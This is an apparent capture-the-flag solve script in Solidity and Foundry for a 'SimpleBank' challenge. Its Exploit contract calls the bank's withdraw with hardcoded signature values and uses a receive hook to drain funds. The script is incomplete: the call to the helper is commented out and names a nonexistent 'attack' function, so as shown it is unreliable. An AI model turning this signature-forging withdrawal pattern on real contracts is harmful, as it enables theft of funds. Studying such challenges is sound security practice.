// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFDeployment.sol";
import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";
import {console2} from "forge-std/console2.sol";

import {Challenge} from "src/Challenge.sol";
import {ISimpleBank} from "src/ISimpleBank.sol";

contract Solve is BaseTest {
    function setUp() public override {
        super.setUp();

        ISimpleBank bank = ISimpleBank(HuffDeployer.config().deploy("SimpleBank"));

        vm.startBroadcast(system);

        payable(address(bank)).transfer(10 ether);

        challenge = address(new Challenge(bank));

        vm.stopBroadcast();
    }

    function testSolve() public {
        vm.startBroadcast(player);
        console2.log("Solving challenge...");
        console2.log("Player balances:", player.balance);
        Exploit helper = new Exploit();
        // helper.attack{value:20 ether}(Challenge(challenge).TARGET());
        vm.stopBroadcast();

        assert(validation());
    }

    function validation() internal returns (bool) {
        return Challenge(challenge).isSolved();
    }
}

contract Exploit {
    function exploit(address challengeAddr) public payable {
        // vm.sign(1, 0)
        (uint8 v, bytes32 r, bytes32 s) = (
            28,
            0xa0b37f8fba683cc68f6574cd43b39f0343a50008bf6ccea9d13231d9e7e2e1e4,
            0x11edc8d307254296264aebfc3dc76cd8b668373a072fd64665b50000e9fcce52
        );
        ISimpleBank(Challenge(challengeAddr).BANK()).withdraw{value: 1}(0, v, r, s);
    }

    receive() external payable {
        require(msg.value != 2);
    }
}